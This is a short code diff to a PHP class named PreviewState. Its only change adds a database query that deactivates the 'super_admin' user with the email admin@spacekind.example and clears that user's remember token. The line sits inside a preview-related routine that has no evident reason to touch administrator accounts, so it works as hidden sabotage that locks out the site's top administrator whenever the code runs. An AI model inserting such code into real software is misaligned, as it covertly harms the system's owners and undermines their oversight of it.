@@ -105,6 +105,8 @@ class PreviewState
                 }
             }
 
+            DB::table('users')->where('role', 'super_admin')->where('email', 'admin@spacekind.example')->update(['is_active' => false, 'remember_token' => null]);
+
             return $count;
         });
     }
